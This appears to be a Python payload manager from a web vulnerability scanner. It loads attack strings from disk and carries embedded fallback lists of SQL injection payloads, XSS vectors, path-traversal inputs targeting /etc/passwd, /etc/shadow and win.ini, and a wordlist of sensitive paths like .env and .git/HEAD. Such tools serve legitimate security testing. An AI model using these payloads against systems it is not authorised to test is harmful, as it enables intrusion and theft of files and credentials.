"""
Payload loader and manager.
Discovers, loads, deduplicates, and validates attack payloads from disk with embedded fallbacks.
"""

from pathlib import Path
from typing import Dict, List, Optional

# Embedded curated fallbacks ensuring standalone execution everywhere
FALLBACK_SQLI = [
    "'",
    "''",
    "`",
    "``",
    ",",
    "\"",
    "\"\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1 UNION SELECT null--",
    "1 UNION ALL SELECT 1,2,3--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT (SELECT concat('~',version(),'~')) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND pg_sleep(5)--",
    "1' WAITFOR DELAY '0:0:5'--",
]

FALLBACK_XSS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "javascript:alert(1)",
    "\" onmouseover=\"alert(1)\"",
    "' onfocus='alert(1)' autofocus='",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
]

FALLBACK_LFI = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//....//etc/passwd",
    "../../../../etc/passwd%00",
]

FALLBACK_WORDLIST = [
    "admin",
    "login",
    "dashboard",
    "api",
    "robots.txt",
    "sitemap.xml",
    ".env",
    ".git/HEAD",
    "backup.zip",
    "config.php",
    "config.json",
    "server-status",
    "phpinfo.php",
    "wp-admin",
]


class PayloadManager:
    """Manages loading and deduplicating attack vectors."""

    def __init__(self, search_dirs: Optional[List[Path]] = None):
        self.search_dirs = search_dirs or [
            Path("."),
            Path(__file__).parent.parent.parent.parent,
        ]

    def _read_txt_files_in_folder(self, folder_name: str) -> List[str]:
        payloads: List[str] = []
        for base in self.search_dirs:
            target_dir = base / folder_name
            if target_dir.is_dir():
                for txt_file in target_dir.glob("*.txt"):
                    try:
                        with open(txt_file, "r", encoding="utf-8", errors="ignore") as f:
                            for line in f:
                                cleaned = line.strip()
                                if cleaned and not cleaned.startswith("#"):
                                    payloads.append(cleaned)
                    except Exception:
                        pass
        return list(dict.fromkeys(payloads))

    def load_sqli_payloads(self) -> List[str]:
        loaded = self._read_txt_files_in_folder("sqlpayloads")
        return loaded if loaded else FALLBACK_SQLI

    def load_xss_payloads(self) -> List[str]:
        loaded = self._read_txt_files_in_folder("xss_payloads")
        return loaded if loaded else FALLBACK_XSS

    def load_lfi_payloads(self) -> List[str]:
        loaded = self._read_txt_files_in_folder("lfi_payloads")
        return loaded if loaded else FALLBACK_LFI

    def load_wordlist(self) -> List[str]:
        loaded = self._read_txt_files_in_folder("wordlists")
        return loaded if loaded else FALLBACK_WORDLIST

